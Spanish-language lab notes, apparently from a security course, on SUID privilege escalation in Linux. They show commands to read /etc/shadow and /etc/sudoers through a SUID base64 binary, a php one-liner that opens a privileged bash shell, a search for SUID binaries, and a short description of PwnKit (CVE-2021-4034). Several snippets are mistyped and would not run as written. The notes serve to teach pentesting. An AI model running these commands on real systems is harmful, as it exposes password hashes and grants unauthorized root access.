> SUID (Set User ID) es un tipo de permiso especial en sistemas Unix/Linux que permite a los usuarios ejecutar un archivo con los privilegios del propietario del archivo, en lugar de los privilegios del usuario actual. Se usa comúnmente para tareas que requieren acceso elevado, como cambiar contraseñas, pero conlleva altos riesgos de seguridad si se configura incorrectamente.

- Ver clase [[Permisos]]

## Ataque

## Laboratorio
- Utilizamos la herramienta `base64` y le damos permiso SUID
```
chmod u+s /usr/in/base64
which base64 | xargs ls -l
```
- Si queremos leer archivos como savitar (usuario no privilegiado) de primera no podriamos
```
cat /etc/shadow
cat /etc/sudoers
```
- Pero utilizando base64 codificamos esa informacion y luego la decodificamos.
```
base64 /etc/shadow -w 0; echo | base64 -d
```
- Luego con php podemos hacer lo mismo
- Le damos permiso SUID
```
apt install php
which php
chmod u+s /usr/bin/php8.1
```
- php + suid
```
php -r "pcntl_exec{'/bin/bash', ['-p]}"
```
- Luego para encontrar o leer todos los archivos que tienen permisos SUID
```
find / -perm -4000 -ls 2>/dev/null
```
- Una vulnerabilidad reciente se encontro con `pkexec`
	- Se trata de una vulnerabilidad de corrupción de memoria causada por la forma en que los argumentos son leídos por el componente **pkexec** de **PolKit**. Esto permitiría reintroducir en el entorno de pkexec una variable de entorno insegura, que podría permitir la ejecución de librerías arbitrarias, y que normalmente se eliminaría antes de la ejecución del programa. Se ha asignado el identificador CVE-2021-4034 para esta vulnerabilidad.
	- por su nombre **PwnKit** 